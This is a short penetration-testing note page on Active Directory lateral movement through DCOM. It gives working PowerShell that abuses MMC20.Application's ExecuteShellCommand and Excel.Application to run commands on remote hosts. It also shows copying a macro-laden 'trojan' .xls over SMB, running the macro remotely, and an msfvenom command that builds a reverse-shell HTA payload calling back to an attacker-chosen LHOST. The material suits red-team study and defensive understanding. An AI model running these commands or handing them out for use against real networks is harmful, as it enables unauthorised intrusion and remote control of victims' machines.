# Active Directory Lateral Movement With DCOM


[Distributed Component Object Model](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN) (DCOM) are just [Component Object Model (COM)](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal?redirectedfrom=MSDN) -  software components that can interact, but also distributed over a network or networked Windows machines.[The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other](https://en.wikipedia.org/wiki/Component_Object_Model). Similar to [[Object-Oriented-Programming]], but for OS objects and their interactions. [DCOM](https://en.wikipedia.org/wiki/Distributed_Component_Object_Model) being *Distributed* object across a Windows Network. They are ancient technologies that are present from the early days of Windows. DCOM interaction occurs using RPC on TCP port 135 and local administrative access is required to call the DCOM Service Control Manager, which is essentially an API. [Enigmaox3](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)

The attack is based on the abuse of Microsoft Management Console COM application as the MMC Application Class allows the creation of Application Objects exposing `Document.ActiveView\ExecuteShellCommand` property

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$ipAddress"))
# EXecute a command - KEEP THE 7
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c cmd","7")
```


There are various Microsoft Office DCOM objects that allow for lateral movement.  - consider [[Useful-Visual-Basic]]
```powershell
# Create an instance, listing all avaliable methods 
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "$IP"))
$com | Get-Member
```
With the `Run` method we can run VBA macro remotely.
```vba
Sub mymacro()
    Shell ("cmd.exe")
End Sub
```
Using legacy .xls formatting the macro is write inside the Office \*-application and then copied to a remote filesystem through SMB using .NET `Copy` method of `System.IO.File` class.
```powershell
$LocalPath = "C:\Users\Administrator\mytrojan.xls"
$RemotePath = "\\$IP\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```
To then open it remotely
```powershell
$Path = "\\$IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```

The `base64` encode [[MSFVenom-Payloads]] command to create .hta attack is:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f hta-psh -o evil.hta
```
The `LHOST` can be the DC that can called back to a listener.

[[Impacket-Cheatsheet]] with `dccomexec`